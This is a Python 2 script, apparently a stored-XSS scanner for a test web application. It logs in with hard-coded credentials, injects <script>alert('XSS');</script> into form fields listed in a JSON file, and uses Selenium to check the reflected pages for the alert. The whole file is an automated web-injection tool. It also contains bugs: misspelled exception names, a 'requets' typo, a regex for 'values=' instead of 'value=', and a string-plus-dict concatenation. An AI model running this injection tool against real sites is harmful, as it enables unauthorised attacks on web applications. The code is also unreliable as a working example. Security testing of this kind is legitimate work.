import json
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, NoAlertPresentException
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib, urllib2, cookielib
import requests
from bs4 import BeautifulSoup
import re
import time
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

blacklist = ("cancel","remove","delete")
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_element_exists(name,driver):
    try:
        inputElement = driver.find_element_by_name(name)
    except NoSuchELementException:
        return False
    return inputElement

def check_submit_exists(driver):
    try:
        inputElement = driver.find_element_by_xpath("//input[@type='submit']")
    except NoSuchELementException:
        return False
    return inputElement

def check_for_forms(session,r,root,url):
    checkForm = True
    while checkForm:
        insideForm = False
        submitForm = False
        newTarget = None 
        formMethod = None
        param = {}
        #check if need to submit form again to store info in db
        for line in r.text.splitlines():
            if "<form" in line.lower():
                print"found inner form for url " + url + "\n"
                found = re.match(r".*action\s*=\s*\"\s*([^\s\"]*)\s*\"", line, re.IGNORECASE)
                if found:
                    newTarget = found.group(1)
                    if "http" not in newTarget:
                        newTarget =  root + newTarget
                found = re.match(r".*method\s*=\s*\"\s*([^\s\"]*)\s*\"", line, re.IGNORECASE)
                if found:
                    formMethod = found.group(1)
                insideForm = True
                param.clear()
            elif "</form" in line.lower():
                insideForm = False
            
            if insideForm:
                if "input" in line.lower() and "submit" in line.lower():
                    if any(s in line.lower() for s in blacklist):
                        newTarget = None
                        formMethod = None
                        param.clear()
                elif "input" in line:
                    name = ""
                    value = ""
                    found = re.match(r".*name\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
                    if found:
                        name = found.group(1)
                    found = re.match(r".*values\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
                    if found:
                        value = found.group(1)
                    if not found or not value.strip():
                        insideForm = False
                        newTarget = None
                        formMethod = None
                        param.clear()
                    param.update({name:value})
                elif "textarea" in line:
                    insideForm = False
                    newTarget = None
                    formMethod = None
                    param.clear()
        if newTarget and formMethod:
            print "form check success\n"
            print "url, data is " + newTarget + "," + param + "\n"
            if "post" in formMethod.lower():
                r = session.post(newTarget, data=param, verify=False)
            elif "get" in formMethod.lower():
                r = requets.get(url, params=param, verify=False)
        else:
            checkForm = False
                
                
#Reading the injection points list from the stored.json file

with open('stored.json') as injection_points_file:
    injection_points = json.load(injection_points_file)

#Read possible payloads from txt file

#with open('tmp_xss_payloads.txt') as payloads_file:
#    payloads = payloads_file.read().splitlines();
payloads = ["<script>alert('XSS');</script>"]
driver = webdriver.Firefox()
generic_name = "Test"
attackString = "XSS"
username = "scanner1"
password = "scanner1"

#Iterating through injection points, and trying each payload for them
for tmp in injection_points:
    url = tmp["action"]
    print "Currently checking the url " + url + "\n"
    unamefieldtext = "username"
    passwdfieldtext = "password"
    login_url = "https://app1.com/users/login.php"

    params = tmp["param"]
    method = tmp["method"]
    reflected_pages = tmp["reflected_pages"]
    urlComponents = url.split("/")
    root = urlComponents[0] + "//" + urlComponents[2]

    #start session by loggin in
    session = requests.session()

    login_data = dict()
    login_data.update({unamefieldtext:username})
    login_data.update({passwdfieldtext:password})

    r = session.post(login_url,data=login_data,verify=False)
    
    #Iterate through the all the payloads until something works
    for payload in payloads:
        param_values = dict()
        for param in params:
            if "name" in param.lower():
                param_values[param] = generic_name
            elif "id" in param.lower():
                param_values[param] = 13
            else:
                param_values[param] = payload


        #If get add the payload to url params and then execute url/button click
        if "get" in method.lower():
            r = requests.get(url, params=param_values, verify=False)
        
        if "post" in method.lower():
            r = session.post(url, data=param_values, verify=False)
        
        check_for_forms(session,r,root,url)
        success_flag = 0
        #open reflected page and see if payload has come successfully through PXSS
        #before opening reflected pages, do a login
        driver.get(login_url)
        usernameField = check_element_exists(unamefieldtext,driver)
        passwordField = check_element_exists(passwdfieldtext,driver)
        buttonField = check_submit_exists(driver)

        if (usernameField and passwordField and buttonField):
            usernameField.send_keys(username)
            passwordField.send_keys(password)
            buttonField.click()

        for page in reflected_pages:
            driver.get(page)
            time.sleep(5)
            try:
                if EC.alert_is_present():
                    alert = driver.switch_to_alert()
                    if attackString in alert.text:
                        print "exploit verified in " + driver.current_url
                    alert.accept()
                    time.sleep(2)
            except NoAlertPresentException:
                print "Cleared all alerts on page"
driver.quit()